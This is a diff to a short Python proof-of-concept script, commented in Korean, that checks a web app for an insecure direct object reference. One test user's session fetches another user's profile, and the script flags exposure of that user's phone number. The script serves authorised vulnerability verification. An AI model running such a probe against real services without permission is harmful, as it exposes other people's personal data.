@@ -84,14 +84,17 @@ else:
 from poclib import Client, render
 TARGET = "%%TARGET%%"
 
-usera = Client(TARGET).signup(username="usera", email="usera@poc.io")
-userb = Client(TARGET).signup(username="userb", email="userb@poc.io")
+PHONE = "01055012047"                  # userA 사적 PII(전화번호) — 프롬프트 예시(01012345678)와
+                                       # 겹치지 않는 값이라 앱 시드와 충돌하지 않는다
+usera = Client(TARGET).signup(username="poc_ua", phone=PHONE)
+userb = Client(TARGET).signup(username="poc_ub")
 
 uid = usera.my_id()                    # userA 자신의 id
 r = userb.get(f"/users/{uid}")         # 공격: userB 세션으로 userA 프로필 조회
 print(f"[*] userB -> GET /users/{uid} : {r.status_code}")
-if "usera@poc.io" in r.text:
-    print("[!] EXPLOITED: 타인(userA) 이메일 노출 → IDOR")
+digits = "".join(c for c in r.text if c.isdigit())   # 앱이 형식을 바꿔도 매칭
+if PHONE in digits:
+    print("[!] EXPLOITED: 타인(userA) 전화번호 노출 → IDOR/PII")
     render(r)
 else:
     print("[-] 방어됨: 타인 리소스 접근 차단")
